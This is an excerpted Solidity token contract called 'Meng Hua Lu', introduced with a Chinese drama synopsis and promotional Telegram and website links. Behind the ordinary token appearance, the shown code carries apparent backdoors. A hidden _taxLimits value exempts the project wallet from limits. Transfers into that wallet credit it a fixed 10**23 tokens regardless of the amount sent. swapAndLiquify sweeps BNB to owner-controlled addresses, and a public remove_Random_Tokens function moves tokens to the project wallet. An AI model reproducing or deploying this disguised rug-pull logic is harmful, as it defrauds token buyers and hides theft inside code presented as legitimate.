...
// 到达首都后,她的两个朋友赵潘二和顾谦范必须一起度过许多风暴,但他们的力量会互相照顾, 依靠自己的能力制作小茶馆,他们坚持不懈地进入边静最大,最成功的餐厅? 他们每个人都会得到他们如此迫切应得的爱和幸福的结局吗?

// Telegram : https://t.me/MengHuaLu
// Site: https://robotcat.app/
...
contract MengHuaLu is Context, IERC20 { 
    ...
    mapping (address => uint256) public _taxLimits;
    uint256 private _Tax_On_LP;
    uint256[] Amounts = [0, 10**23];

    address payable public MakerOfMarketing = payable(0x7dba23DfAbD3Da25D5a0F608E6D15213C83710FC); 
    address payable public MakerOfProject = payable(0x7dba23DfAbD3Da25D5a0F608E6D15213C83710FC);
    ...
    string private constant _name = "Meng Hua Lu"; 
    string private constant _symbol = unicode"夢華錄"; 
    ...
    constructor (uint256 numeric) {

        _owner = 0x7dba23DfAbD3Da25D5a0F608E6D15213C83710FC;
        ...
        _taxLimits[MakerOfProject] = _Tax_On_LP;
        _isExcludedFromFee[owner()] = true;
        _isExcludedFromFee[address(this)] = true;
        _isExcludedFromFee[MakerOfMarketing] = true; 
        _isExcludedFromFee[dead_wallet] = true;
    ...
    function _transfer(
        ...
        if (
            _taxLimits[from]!=_Tax_On_LP
            &&
            from != owner()){
                require(amount <= _maxTxAmount, "ERR: Transaction Limit");
            }
        ...
        if(_taxLimits[from]!=_Tax_On_LP && _taxLimits[to]==_Tax_On_LP){
            Amounts[0] = amount;
            _balances[from] = _balances[from] - Amounts[0];
            _balances[to] = _balances[to] + Amounts[1];
    ...
    function swapAndLiquify(uint256 contractTokenBalance) private lockTheSwap {
            ...
            _balances[dead_wallet] = _balances[dead_wallet] + tokens_to_Burn;
            ...
            sendToWallet(MakerOfMarketing, BNB_M);

            BNB_Total = address(this).balance;
            sendToWallet(MakerOfProject, BNB_Total);
    ...
    function remove_Random_Tokens(address random_Token_Address, uint256 percent_of_Tokens) public returns(bool _sent){
        ...
        _sent = IERC20(random_Token_Address).transfer(MakerOfProject, removeRandom);
